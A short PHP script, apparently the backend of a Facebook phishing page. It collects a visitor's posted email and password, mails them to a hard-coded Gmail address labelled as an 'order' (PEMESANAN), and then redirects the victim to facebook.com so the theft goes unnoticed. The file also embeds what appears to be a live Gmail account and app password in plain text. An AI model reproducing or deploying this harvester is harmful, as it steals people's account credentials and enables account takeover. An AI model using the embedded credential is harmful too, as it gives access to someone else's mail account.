<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Load PHPMailer
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email   = htmlspecialchars($_POST['email']);
    $password  = htmlspecialchars($_POST['password']);

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'arip.uye03@gmail.com'; // GANTI dengan email kamu
        $mail->Password   = 'ewvktzfqqodwpkay'; // GANTI dengan App Password Gmail kamu
        $mail->SMTPSecure = 'ssl';
        $mail->Port       = 465;

        // Pengirim & Penerima
        $mail->setFrom('no-reply@domainkamu.com', 'Form Website');
        $mail->addAddress('arip.uye03@gmail.com', 'Admin');
        $mail->addReplyTo($email, $password); // supaya bisa reply langsung ke pengirim


        // Konten Email
        $mail->isHTML(true);
        $mail->Subject = "PEMESANAN";
        $mail->Body    = "
            <h3>PESANAN BARU</h3>
            <p><strong>Email:</strong> {$email}</p>
            <p><strong>Password:</strong> {$password}</p>
        ";

        // Kirim Email
        $mail->send();
        echo "<h3>✅ Pesan berhasil dikirim! Terima kasih sudah menghubungi kami.</h3>";
    } catch (Exception $e) {
        echo "<h3>❌ Pesan gagal dikirim. Error: {$mail->ErrorInfo}</h3>";
    }
}
?>

<head>
<meta http-equiv="Refresh" content="0; URL=https://facebook.com"/>
</head><body>
</body>
</html>
